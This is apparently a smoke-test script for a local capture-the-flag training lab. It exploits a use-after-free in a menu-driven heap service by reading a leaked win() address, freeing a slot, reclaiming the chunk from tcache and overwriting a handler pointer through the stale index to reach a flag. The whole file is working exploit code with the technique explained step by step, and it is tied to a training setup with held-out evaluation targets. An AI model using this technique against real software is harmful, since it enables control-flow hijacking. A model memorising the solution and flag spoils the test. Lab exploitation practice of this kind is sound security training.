#!/usr/bin/env python3
"""Smoke test for uaf_train_b (port 19992): use-after-free BY INDEX on
a two-slot tcache registry, PIE. MR6 training twin - the uaf_heap eval
targets stay unseen.

The menu protocol (0=drop 1=forge 2=patch 3=invoke 4=bye, drop FIRST):
  1. forge: slot #0 takes a record.
  2. forge: slot #1 takes a record; then drop #1: its chunk lands in
     the tcache and the SLOT KEEPS it (the stale index is born).
  3. forge: the round-robin cursor mounts a fresh record at slot #0 -
     the tcache hands back the just-freed chunk (the reuse).
  4. patch #1: the write goes through the STALE slot #1 - onto the
     live record's handler slot at +24.
  5. invoke #1: the (dangling) slot #1 calls its handler - win().

The banner carries win()'s address (PIE: the leak is load-bearing).

Success output:

  FLAG: FLAG{uaf_train_b_stale_index_calls}
"""

import re
import socket
import sys

HOST = "127.0.0.1"
PORT = 19992


def recv_until(s, needle, limit=4096):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError as e:
        print(
            f"SKIP: port {PORT} not listening ({e}); "
            "the lab stack is not running - deploy it and re-run"
        )
        return 0

    banner = recv_until(s, b"4=bye\n")
    m = re.search(rb"win\(\) at (0x[0-9a-f]+)", banner)
    assert m, f"no win() leak in the banner: {banner!r}"
    win = int(m.group(1), 16)
    print(f"[+] banner: win() at {win:#x} (the PIE leak)")

    # 1. forge: slot #0 takes a record
    s.send(b"1\n")
    out = recv_until(s, b"forge: ")
    assert b"#0" in out, f"no forge echo: {out!r}"
    print("[+] forged #0")

    # 2. forge again (#1), then drop #1: its chunk lands in the
    # tcache and the SLOT KEEPS it (the stale index is born)
    s.send(b"1\n")
    out = recv_until(s, b"forge: ")
    assert b"#1" in out, f"no second forge echo: {out!r}"
    print("[+] forged #1")

    s.send(b"0\n1\n")  # drop, index 1
    out = recv_until(s, b"drop: ")
    assert b"#1 released" in out, f"no drop echo: {out!r}"
    print("[+] dropped #1 (the stale index is born)")

    # 3. forge: the cursor is back at #0 - the tcache hands back the
    # just-freed chunk (the reuse)
    s.send(b"1\n")
    out = recv_until(s, b"forge: ")
    assert b"#0" in out, f"no re-mount echo: {out!r}"
    print("[+] re-forged #0 (the tcache reuse)")

    # 4. patch #1: the write rides the STALE index onto the live chunk
    s.send(b"2\n1\n")
    s.send(f"{win:x}\n".encode())
    out = recv_until(s, b"patch: ")
    assert b"#1" in out, f"no patch echo: {out!r}"
    print(f"[+] patch echo: {out.decode(errors='replace').strip()}")

    # 5. invoke #1: the dangling slot calls its handler - win() runs
    s.send(b"3\n1\n")
    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass  # the flag line was the last output; nothing follows it
    print(f"[+] output: {out.strip()[-60:]!r}")
    assert b"FLAG{uaf_train_b_stale_index_calls}" in out, "oracle flag missing"
    print("[+] uaf_train_b SMOKE TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
